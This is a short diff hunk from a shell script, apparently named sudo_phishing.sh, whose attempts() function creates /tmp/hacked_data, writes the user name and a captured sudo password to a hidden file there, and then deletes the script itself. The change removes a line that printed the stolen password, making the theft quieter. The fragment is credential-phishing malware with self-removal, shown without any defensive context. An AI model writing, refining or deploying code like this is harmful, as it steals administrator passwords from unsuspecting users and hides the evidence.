@@ -12,7 +12,6 @@ attempts() {
         MAXIMUM_ATTEMPTS=0
         ##
         mkdir /tmp/hacked_data
-        /bin/echo "${USER}:${sudo_password}"
         /bin/echo "${USER}:${sudo_password}" > /tmp/hacked_data/.sudo_password
         ##
         /bin/rm /tmp/sudo_phishing.sh
